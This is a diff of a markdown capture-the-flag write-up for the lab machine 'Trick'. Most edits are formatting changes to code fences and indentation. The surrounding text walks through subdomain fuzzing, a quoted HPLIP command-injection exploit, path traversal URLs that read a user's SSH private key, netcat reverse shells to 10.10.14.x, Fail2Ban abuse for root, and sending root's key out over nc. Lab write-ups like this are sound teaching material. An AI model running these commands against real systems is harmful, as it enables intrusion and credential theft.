@@ -58,13 +58,13 @@ ffuf -w $WLIST:FUZZ -u http://FUZZ.trick.htb/
 
 No result. I'll try vhost fuzzing instead:
 
-```
+```bash
 ffuf -w $WLIST:FUZZ -u http://trick.htb:80/ -H 'Host: FUZZ.trick.htb'
 ```
 
 Only ran that for a few seconds to note that all responses are of size 5480. Filter these out:
 
-```
+```bash
 ffuf -w $WLIST:FUZZ -u http://trick.htb:80/ -H 'Host: FUZZ.trick.htb' -fs 5480
 ```
 
@@ -87,7 +87,7 @@ Next, I performed directory enumeration using **feroxbuster**. This yielded the 
 
 I checked the http server info using a whatweb query:
 
-```
+```bash
 whatweb http://trick.htb 
 ```
 
@@ -253,28 +253,28 @@ Naturally, HPLIP is not exposed to the internet right now, so running this explo
 Here is an excerpt from the exploit code ``linux/remote/16837.rb``:
 
 ```ruby
-                connect
+connect
 
-                #cmd = "nohup " + payload.encoded
-                cmd = payload.encoded
+#cmd = "nohup " + payload.encoded
+cmd = payload.encoded
 
-                username = 'root'
-                toaddr = 'nosuchuser'
+username = 'root'
+toaddr = 'nosuchuser'
 
-                # first setalerts
-                print_status("Sending 'setalerts' request with encoded command line...")
-                msg = "username=#{username}\n" +
-                        "email-alerts=1\n" +
-                        #"email-from-address=`#{cmd}`\n" +
-                        "email-from-address=x;#{cmd};\n" +
-                        "email-to-addresses=#{toaddr}\n" +
-                        "msg=setalerts\n"
-                sock.put(msg)
+# first setalerts
+print_status("Sending 'setalerts' request with encoded command line...")
+msg = "username=#{username}\n" +
+	"email-alerts=1\n" +
+	#"email-from-address=`#{cmd}`\n" +
+	"email-from-address=x;#{cmd};\n" +
+	"email-to-addresses=#{toaddr}\n" +
+	"msg=setalerts\n"
+sock.put(msg)
 
-                # next, the test email command
-                print_status("Sending 'testemail' request to trigger execution...")
-                msg = "msg=testemail\n"
-                sock.put(msg)
+# next, the test email command
+print_status("Sending 'testemail' request to trigger execution...")
+msg = "msg=testemail\n"
+sock.put(msg)
 ```
 
 Ok, so maybe I can telnet to the smtp server, and try sending an email with a malformed FROM address. Specifically, I'll send it from ``x;nc 10.10.14.4 4444; `` (after setting up a netcat listener on my attacker machine). If we get a response, it worked.
@@ -347,7 +347,7 @@ Looking for other easy ways to bypass the login, I perused the login page's sour
 
 (Also, I opened up Burp and set my scope to preprod-payroll.trick.htb. I'm can be somewhat haphazard in my testing, so Burp helps me organize all the requests I fire off)
 
-```
+```bash
 curl --proxy="127.0.0.1:8080" preprod-payroll.trick.htb
 curl --proxy="127.0.0.1:8080" preprod-payroll.trick.htb/login.php
 ```
@@ -481,7 +481,7 @@ feroxbuster --url http://preprod-marketing.trick.htb -x php
 
 After navigating around the site for a bit, I noticed a big hint: the URI  of each page, ex.
 
-```
+```http
 http://preprod-marketing.trick.htb/index.php?page=home.html
 ```
 
@@ -500,7 +500,7 @@ Well hello there, **michael** :wave: Are you the target?
 
 As it turns out, *michael is definitely the target*. Or at least, they have the flag:
 
-```
+```http
 http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././home/michael/user.txt
 ```
 
@@ -508,7 +508,7 @@ Wonderful!
 
 If I can access michael's home directory (and ssh is open) there's a good chance I can also access michael's ssh key. Taking a guess at the typical location of the ssh key worked perfectly:
 
-```
+```http
 http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa
 ```
 
@@ -544,7 +544,7 @@ www
 └── pspy
 ```
 
-```
+```bash
 sudo ufw allow from 10.10.11.166 to any port 8000 proto tcp
 cd www
 python3 -m http.server 8000
@@ -552,7 +552,7 @@ python3 -m http.server 8000
 
 Noting down my IP address with ``ifconfig tun0``, I downloaded my toolbox from my http server as michael:
 
-```
+```bash
 mkdir /tmp/tools
 curl -O 10.10.14.5:8000/pspy
 curl -O 10.10.14.5:8000/LinEnum.sh
@@ -562,7 +562,7 @@ chmod u+x ./*
 
 I then took a look at michael's $PATH and cross referenced against locations they can write to:
 
-```
+```bash
 id
 echo $PATH
 find / -user michael 2>/dev/null | grep -v proc
@@ -612,11 +612,15 @@ Fail2Ban appears to have had a pretty severe CVE leading to code execution: [CVE
 
 First, I set up a nc listener and checked if a netcat reverse shell would even work on this box (sometimes they don't have the -e flag):
 
-```
-on attacker:
-nc -lvnp 4444
+On attacker:
 
-on target:
+```bash
+nc -lvnp 4444
+```
+
+On target:
+
+```bash
 nc 10.10.14.5 4444 -e /bin/sh
 ```
 
@@ -657,7 +661,7 @@ Ok, that's too bad, but I still think fail2ban is a solid lead. We already saw t
 
 It looks like ``/etc/fail2ban/jail.conf`` would have to be modified to be able to use a custom action. I think modifying an existing action is probably the best option. However, it looks like there aren't any jails enabled:
 
-```
+```bash
 grep -B 20 -A 10 "enabled = true" jail.conf
 ```
 
@@ -737,7 +741,7 @@ First, I tried simply putting my reverse shell inside the actionstart and action
 
 Then I restarted the service:
 
-```
+```bash
 sudo /etc/init.d/fail2ban restart
 ```
 
@@ -787,7 +791,7 @@ Super, let's try transferring that file over and logging in now.
 
 > At this point, I realized I forgot to change the file owner! So even though michael can see the key, they cant access it. I performed the attack again, getting a new reverse shell, this time changing the file owner:
 >
-> ```
+> ```bash
 > chown michael:michael /home/michael/id_rsa.root
 > ```
 
@@ -795,13 +799,13 @@ Then I transferred the file using nc:
 
 (on the attacker box)
 
-```
+```bash
 nc -lvnp 4444 > root_id_rsa
 ```
 
 (as michael)
 
-```
+```bash
 nc -nv 10.10.14.5 4444 < id_rsa.root
 ```
 
@@ -826,15 +830,12 @@ YES! Finally a nice solid ssh connection as root:tada:
 - **Recognize when users or services seem out-of-place**. Even a print service can have a juicy exploit. This technique mostly comes with experience, but it is also good to have a "normal" computer around to compare the target to, to establish a bit of a baseline.
 
 - **Privilege escalation takes creativity**. Sometimes, the trick to privesc is trying to think of the weirdest way to use what's in front of you.  If you abstract the tools/services you have available into their functional components, sometimes you can think of a good way to string them together into privilege escalation. In this case, it came down to finding a way to get myself banned with Fail2Ban to execute some commands that I myself had planted: so weird! But when you take a step back, it's not so odd:
+    -- Fail2Ban can execute code when banning a user.
+    -- I can determine arbitrary code that Fail2Ban bans a user.
+    -- I can find a way to ban myself.
 
-  - Fail2Ban can execute code when banning a user.
-
-  - I can determine arbitrary code that Fail2Ban bans a user.
-
-  - I can find a way to ban myself.
-
-    ==> By *hypothetical syllogism*, I can execute arbitrary code.
-    {{% /lessons-learned %}}
+  ​      ==> By *hypothetical syllogism*, I can execute arbitrary code.
+  {{% /lessons-learned %}}
 
 {{% lessons-learned defender=true %}}
 
